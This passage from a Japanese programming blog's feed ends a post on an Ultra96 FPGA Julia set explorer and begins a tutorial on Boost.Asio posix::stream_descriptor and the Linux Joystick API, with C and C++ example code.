<span id="cb28-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-15" aria-hidden="true" tabindex="-1"></a>  EGLImageKHR image <span class="op">=</span></span>
<span id="cb28-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-16" aria-hidden="true" tabindex="-1"></a>      eglCreateImageKHR<span class="op">(</span>egl_dpy<span class="op">,</span> EGL_NO_CONTEXT<span class="op">,</span> EGL_LINUX_DMA_BUF_EXT<span class="op">,</span> NULL<span class="op">,</span> attrs<span class="op">);</span></span>
<span id="cb28-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-18" aria-hidden="true" tabindex="-1"></a>  glBindTexture<span class="op">(</span>GL_TEXTURE_EXTERNAL_OES<span class="op">,</span> textures<span class="op">[</span>i<span class="op">]);</span></span>
<span id="cb28-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-19" aria-hidden="true" tabindex="-1"></a>  glEGLImageTargetTexture2DOES<span class="op">(</span>GL_TEXTURE_EXTERNAL_OES<span class="op">,</span> image<span class="op">);</span></span>
<span id="cb28-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-20" aria-hidden="true" tabindex="-1"></a>  glBindTexture<span class="op">(</span>GL_TEXTURE_EXTERNAL_OES<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb28-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb28-21" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h2 id="まとめ">まとめ</h2>
<p>Zynq UltraScale+ MPSoC の開発ボードである Ultra96 を用いて、FPGA、デバイスドライバ、デスクトップアプリケーションと、ハードウェアからソフトウェアまでを一通り実装して何かを作ってみた事例を紹介しました。なんか面白そうなデバイスがあるなーとか、最近の FPGA ってこんな開発方法があるのかーというのが伝わればいいなと思っています。</p>
<p>最後に、今回実装した Julia set explorer の元ネタというか、とても影響を受けている作品を紹介しようと思います。Chiaki Nakajima さんの <a href="http://www.chiaki.cc/Pyxis2010/index.htm">Pyxis 2010</a> です。記事を見つけた当時 (6 ~ 7年前くらい？)、なんか FPGA っていうすごい素子があるんだなーというのと、なによりゲーム機を改造した作品ということでとても興味をひかれたのを覚えています。</p>
<h2 id="追記-20190830">追記 (2019/08/30)</h2>
<p>もう少し強くなりました: <a href="https://blog.myon.info/entry/2019/08/29/ultra96-julia-set-explorer-2/">Ultra96 で Julia set をぐりぐり動かせるやつをもう少し強くした</a></p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>学生が一度にポンと出すにはちょっと大変な価格かな… ラボのボスに頼んでみよう ヾ(๑╹◡╹)ﾉ”<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>プロジェクト設定で <code>CFLAGS</code> に <code>-std=c++11</code> を設定する。ベースとなっているコンパイラもあまり新しいものではないようなので、<code>-std=c++17</code>、<code>-std=c++14</code>、<code>-std=c++1y</code> とかはもちろんダメだったし、C++11 の機能にも未対応なものがいくつかあったりする。C/RTL co-simulation が動作しなくなる副作用もある<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>ネタ性が高いだけで実際あんまり嬉しくない<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>リンク先のドキュメントは微妙に違っていて、たぶん write/tx → read/tx、read/rx → write/rx が正しい。<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>いきあたりばったりな実装をしていてアレなことになっているのでなんとかしたい…<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p>現時点では未実装で、表示されているのは適当な値<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn7" role="doc-endnote"><p>Xilinx Wiki ってしょっちゅう403になってこまる…<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn8" role="doc-endnote"><p>Zynq UltraScale+ MPSoC の DisplayPort Controller 自体に映像の合成機能があるのでこれが使えないかなーと思ったのですが、Linux からやろうとするとちょっと難しそうだったのと、ベアメタル実装でいろいろ検証していたときに<a href="https://twitter.com/myon___/status/1080115506093338627">検討していたパターンで上手く行かなかったりした</a>のでやめました<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref8" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn9" role="doc-endnote"><p>細かな処理を省いているのでこのコードはコピペではたぶん動きません<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref9" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn10" role="doc-endnote"><p>これも細かな処理を省いているのでこのコードはコピペではたぶん動きません<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fnref10" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Boost.Asio の posix::stream_descriptor を使う</title>
    <link href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/index.html" />
    <id>https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/index.html</id>
    <published>2018-10-14T13:59:00Z</published>
    <updated>2018-10-14T13:59:00Z</updated>
    <summary type="html"><![CDATA[<p>C++熱は冷めてしまったのですが、いつか書こうと思っていたことを書かないのもアレだなぁということで、久しぶりの C++ ネタです。</p>
<p><a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio.html">Boost.Asio</a> は、個人的に好きな C++ ライブラリの1つです。以前にもこのブログで、HTTP クライアント (Twitter API というか OAuth を叩くライブラリ) やシリアル通信をする例を紹介しました。</p>
<p>今回紹介するのは <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/posix__stream_descriptor.html"><code>posix::stream_descriptor</code></a> です。名前からなんとなく想像できるように、ファイルディスクリプタを渡してストリーム形式のデータをやり取りするためのものです。これを使って、<code>open(2)</code> したデバイスを Boost.Asio の API で操作してみたいと思います。</p>
<!--more-->
<h2 id="環境">環境</h2>
<ul>
<li>Arch Linux (x86_64)
<ul>
<li>boost: 1.68.0</li>
<li>clang: 7.0.0-1</li>
<li>glibc: 2.28-4</li>
<li>linux-api-headers: 4.17.11-1</li>
<li>linux: 4.18.12.arch1-1</li>
</ul></li>
<li>Logicool Gamepad F310</li>
</ul>
<h2 id="とりあえず使ってみる">とりあえず使ってみる</h2>
<p>身近なファイルディスクリプタといわれてまず挙がるのが標準入出力 (<code>STDIN_FILENO</code>, <code>STDOUT_FILENO</code>) でしょう。<a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/posix__stream_descriptor.html"><code>posix::stream_descriptor</code></a> でこれらのファイルディスクリプタを操作して、入力されたものをそのまま出力する、引数なしで実行した <a href="https://linux.die.net/man/1/cat"><code>cat(1)</code></a> コマンドのような動作をするプログラムを書いてみるとこんな感じです。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb1-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;iostream&gt;</span></span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;boost/asio.hpp&gt;</span></span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="at">extern</span> <span class="st">&quot;C&quot;</span> <span class="op">{</span></span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="kw">auto</span> main<span class="op">()</span> <span class="op">-&gt;</span> <span class="dt">int</span> <span class="op">{</span></span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>io_context<span class="op"> </span>ctx<span class="op">{};</span></span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>posix<span class="ex">::</span>stream_descriptor<span class="op"> </span>stream_in<span class="op">{</span>ctx<span class="op">,</span> <span class="op">::</span>dup<span class="op">(</span>STDIN_FILENO<span class="op">)};</span></span>
<span id="cb1-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>posix<span class="ex">::</span>stream_descriptor<span class="op"> </span>stream_out<span class="op">{</span>ctx<span class="op">,</span> <span class="op">::</span>dup<span class="op">(</span>STDOUT_FILENO<span class="op">)};</span></span>
<span id="cb1-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-14" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>asio<span class="ex">::</span>streambuf<span class="op"> </span>buffer<span class="op">{};</span></span>
<span id="cb1-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-15" aria-hidden="true" tabindex="-1"></a>  <span class="ex">boost::</span>system<span class="ex">::</span>error_code<span class="op"> </span>error<span class="op">{};</span></span>
<span id="cb1-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span><span class="ex">boost::</span>asio<span class="ex">::</span>read<span class="op">(</span>stream_in<span class="op">,</span> buffer<span class="op">,</span> <span class="ex">boost::</span>asio<span class="ex">::</span>transfer_at_least<span class="op">(</span><span class="dv">1</span><span class="op">),</span> error<span class="op">))</span> <span class="op">{</span></span>
<span id="cb1-18"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">boost::</span>asio<span class="ex">::</span>write<span class="op">(</span>stream_out<span class="op">,</span> buffer<span class="op">);</span></span>
<span id="cb1-19"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-19" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb1-20"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-21"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>error <span class="op">!=</span> <span class="ex">boost::</span>asio<span class="ex">::</span>error<span class="ex">::</span>eof<span class="op">)</span> <span class="op">{</span></span>
<span id="cb1-22"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-22" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>cerr<span class="op"> &lt;&lt;</span> error<span class="op">.</span>message<span class="op">()</span> <span class="op">&lt;&lt;</span> <span class="bu">std::</span>endl<span class="op">;</span></span>
<span id="cb1-23"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-23" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb1-24"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-24" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb1-25"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>posix::stream_descriptor</code> は、コンストラクタに <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/io_context.html"><code>io_context</code></a> と操作したいファイルディスクリプタを渡してやるだけで準備完了です。あとはいつものように、<a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/read.html"><code>read</code></a> や <a href="https://www.boost.org/doc/libs/1_68_0/doc/html/boost_asio/reference/write.html"><code>write</code></a>、<code>async_xxx</code> などの操作ができるようになります。簡単ですね。</p>
<p style="text-align: center;">
<object data="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/mycat.svg" style="max-width: 100%">
</object>
</p>
<h2 id="linux-の-joystick-api">Linux の Joystick API</h2>
<p>もう少し複雑な <code>posix::stream_descriptor</code> の使用例として、Linux の Joystick API を使ったものを紹介しようと思います。なぜ Joystick なのかというと、<a href="https://www.kernel.org/doc/html/v4.18/input/joydev/joystick-api.html">ドキュメント</a>にあるようにとても単純で、なにか対象をそれっぽく動かしたいときにシュッと使えていいなーと思っているからです<a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。</p>
<p>Linux マシンに Joystick を接続すると、<code>/dev/input/jsX</code> が出現します。これを <a href="https://linux.die.net/man/2/open"><code>open(2)</code></a> して <a href="https://linux.die.net/man/2/read"><code>read(2)</code></a> すると、Joystick の状態の変化を <code>struct js_event</code> の形式で取得することができます。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> js_event <span class="op">{</span></span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb2-2" aria-hidden="true" tabindex="-1"></a>        __u32 time<span class="op">;</span>     <span class="co">/* event timestamp in milliseconds */</span></span>
<span id="cb2-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb2-3" aria-hidden="true" tabindex="-1"></a>        __s16 value<span class="op">;</span>    <span class="co">/* value */</span></span>
<span id="cb2-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb2-4" aria-hidden="true" tabindex="-1"></a>        __u8 type<span class="op">;</span>      <span class="co">/* event type */</span></span>
<span id="cb2-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb2-5" aria-hidden="true" tabindex="-1"></a>        __u8 number<span class="op">;</span>    <span class="co">/* axis/button number */</span></span>
<span id="cb2-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
<p><a href="https://www.kernel.org/doc/html/v4.18/input/joydev/joystick-api.html#js-event-type"><code>js_event.type</code></a> はイベントの種類を表すもので、ボタンが押された/離されたを示す <code>JS_EVENT_BUTTON</code>、スティックが動かされたかを示す <code>JS_EVENT_AXIS</code> があります。また、<code>open(2)</code> して最初に <code>read(2)</code> したときに Joystick が持つ全てのボタンやスティックの初期値が送られてくるのですが、その時の値は <code>JS_EVENT_INIT</code> との or をとった値になっています。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JS_EVENT_BUTTON         0x01    </span><span class="co">/* button pressed/released */</span></span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JS_EVENT_AXIS           0x02    </span><span class="co">/* joystick moved */</span></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JS_EVENT_INIT           0x80    </span><span class="co">/* initial state of device */</span></span></code></pre></div>
<p><a href="https://www.kernel.org/doc/html/v4.18/input/joydev/joystick-api.html#js-event-number"><code>js_event.number</code></a> はボタンやスティックのインデックス、<a href="https://www.kernel.org/doc/html/v4.18/input/joydev/joystick-api.html#js-event-value"><code>js_event.value</code></a> は変化後の値です。</p>
<p>接続された Joystick に関する情報は <a href="https://linux.die.net/man/2/ioctl"><code>ioctl(2)</code></a> で取得できます。取得できる情報には以下のようなものがあり、</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-1" aria-hidden="true" tabindex="-1"></a>                        <span class="co">/* function                     3rd arg  */</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JSIOCGAXES      </span><span class="co">/* get number of axes           char     */</span></span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JSIOCGBUTTONS   </span><span class="co">/* get number of buttons        char     */</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JSIOCGVERSION   </span><span class="co">/* get driver version           int      */</span></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JSIOCGNAME(len) </span><span class="co">/* get identifier string        char     */</span></span>
<span id="cb4-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JSIOCSCORR      </span><span class="co">/* set correction values        &amp;js_corr */</span></span>
<span id="cb4-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define JSIOCGCORR      </span><span class="co">/* get correction values        &amp;js_corr */</span></span></code></pre></div>
<p>例えばスティックの数は次のようなコードで取得できます。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> number_of_axes<span class="op">;</span></span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb5-2" aria-hidden="true" tabindex="-1"></a>ioctl<span class="op">(</span>fd<span class="op">,</span> JSIOCGAXES<span class="op">,</span> <span class="op">&amp;</span>number_of_axes<span class="op">);</span></span></code></pre></div>
<h2 id="任意のタイミングで-joystick-の状態を取得したい">任意のタイミングで Joystick の状態を取得したい</h2>
<p>Linux の Joystick API は状態が変化したときにイベントが送られてくるというものなので、任意のタイミングで Joystick の状態を取得したいときにはイベントを監視して内部状態を更新するようなプログラムを実装する必要があります。</p>
<p>例えば 1/60 [s] 毎に Joystick の状態をコンソールに出力するプログラムを実装したいとします<a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>。<a href="https://linux.die.net/man/1/jstest"><code>jstest(1)</code> コマンド</a>のようなイメージです。</p>
<p>雑な実装としては nonblocking mode (<code>open</code> の第2引数に <code>O_NONBLOCK</code> を指定する) やスレッドを用いる方法、もう少し複雑な例としては <a href="https://linux.die.net/man/2/select"><code>select(2)</code></a> を使う方法でしょうか。タイマーに <a href="https://linux.die.net/man/2/timerfd_create"><code>timerfd_create(2)</code></a> を使い、ファイルディスクリプタの監視に <code>select(2)</code> を使って C で実装してみたのがこんな感じです。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;inttypes.h&gt;</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;time.h&gt;</span></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/joystick.h&gt;</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/ioctl.h&gt;</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/select.h&gt;</span></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/time.h&gt;</span></span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/timerfd.h&gt;</span></span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb6-15"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-16"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> joystick_state <span class="op">{</span></span>
<span id="cb6-17"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-17" aria-hidden="true" tabindex="-1"></a>  <span class="dt">uint8_t</span> num_axes<span class="op">;</span></span>
<span id="cb6-18"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-18" aria-hidden="true" tabindex="-1"></a>  <span class="dt">uint8_t</span> num_buttons<span class="op">;</span></span>
<span id="cb6-19"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int16_t</span><span class="op">*</span> axes<span class="op">;</span></span>
<span id="cb6-20"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-20" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int16_t</span><span class="op">*</span> buttons<span class="op">;</span></span>
<span id="cb6-21"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb6-22"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-23"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-23" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> perror_exit<span class="op">(</span><span class="dt">const</span> <span class="dt">char</span><span class="op">*</span> msg<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-24"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-24" aria-hidden="true" tabindex="-1"></a>  perror<span class="op">(</span>msg<span class="op">);</span></span>
<span id="cb6-25"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-25" aria-hidden="true" tabindex="-1"></a>  exit<span class="op">(</span>EXIT_FAILURE<span class="op">);</span></span>
<span id="cb6-26"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-26" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb6-27"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-28"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-28" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> update_joystick_state<span class="op">(</span><span class="kw">struct</span> joystick_state<span class="op">*</span> state<span class="op">,</span> <span class="kw">struct</span> js_event<span class="op">*</span> jse<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-29"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-29" aria-hidden="true" tabindex="-1"></a>  <span class="cf">switch</span> <span class="op">(</span>jse<span class="op">-&gt;</span>type <span class="op">&amp;</span> <span class="op">~</span>JS_EVENT_INIT<span class="op">)</span> <span class="op">{</span></span>
<span id="cb6-30"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> JS_EVENT_AXIS<span class="op">:</span></span>
<span id="cb6-31"><a href="https://blog.myon.info/entry/2018/10/14/boost-asio-posix-stream_descriptor/#cb6-31" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>jse<span class="op">-&gt;</span>number <span class="op">&lt;</span> state<span class="op">-&gt;</span>num_axes<span class="op">)</span> <span class="op">{</span></span>
